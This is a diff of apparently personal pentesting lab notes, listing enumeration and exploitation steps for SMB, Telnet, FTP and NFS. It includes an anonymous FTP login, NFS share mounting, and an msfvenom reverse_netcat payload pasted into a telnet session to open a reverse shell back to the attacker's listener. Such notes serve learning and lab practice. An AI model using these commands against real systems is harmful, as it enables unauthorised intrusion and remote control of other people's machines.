@@ -32,47 +32,49 @@
 * enum4linux [options] ip
 * use option  ```-a``` all of the above (full basic enumeration)
 
-### SMB Exploit
+### SMB Exploit 445, 139
 * smbclient //[IP]/[SHARE]
 * smbclient //10.10.10.2/sharefilename -U username -p 445
 
-## Telnet
+## Telnet 23
 ### Enumerating Telnet
 * nmap
 ### Exploiting
 * telnet [ip] [port]
 
-## FTP 
+## FTP 21
 ### channels 
 * a command (sometimes called the control) channel
 * a data channel.
 ### Enumerating FTP
 * nmap
-
 ### Exploiting
-
 * "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.
 
+## NFS 
+### NFS Tools
+* `sudo apt install nfs-common`
+* by defualt mount,showmount, nfsstat, gssd, idmapd, lockd, statd,
+### Enumeration
+* nmap
+* show all shares '/usr/sbin/showmount -e [IP]' 
+### Exploiting
+* create folder `mkdir /tmp/mount`
+* 'sudo mount -t nfs IP:share /tmp/mount/ -nolock'
 
-# shells 
+# Shells 
 ## Simple Shell msfvenom 
 
-
+* using telnet 
 ```
-If using your own machine with the OpenVPN connection, use:
-sudo tcpdump ip proto \\icmp -i tun0
-If using the AttackBox, use:
-sudo tcpdump ip proto \\icmp -i ens5
-
-
 "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
 -p = payload
 lhost = our local host IP address (this is your machine's IP address)
 lport = the port to listen on (this is the port on your machine)
 R = export the payload in raw format
-copy and paste the value on telnet session 
-```
 
+```
+* copy and paste the value on telnet session 
 
 # other Important 
 ## Start a tcpdump listener
